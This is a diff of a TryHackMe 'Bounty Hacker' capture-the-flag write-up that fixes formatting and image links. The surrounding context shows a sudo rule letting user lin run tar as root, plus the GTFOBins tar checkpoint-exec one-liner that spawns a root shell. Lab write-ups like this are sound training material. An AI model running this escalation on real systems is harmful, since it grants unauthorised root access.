@@ -194,9 +194,11 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
-Now that we have determined that we can access to ``user.txt`, lets see how we can abuse this feature on: [GTFOBins](https://gtfobins.github.io/).
-![alt text](https://github.com/4lch3my/WriteUps/tree/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar.png)
-![alt text](https://github.com/4lch3my/WriteUps/tree/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar2.png)
+Now that we have determined that we can access to `user.txt`, lets see how we can abuse this feature on: [GTFOBins](https://gtfobins.github.io/).
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar.png)
+<br>
+
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar2.png)
 Now let's run it against the root user: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
 ```
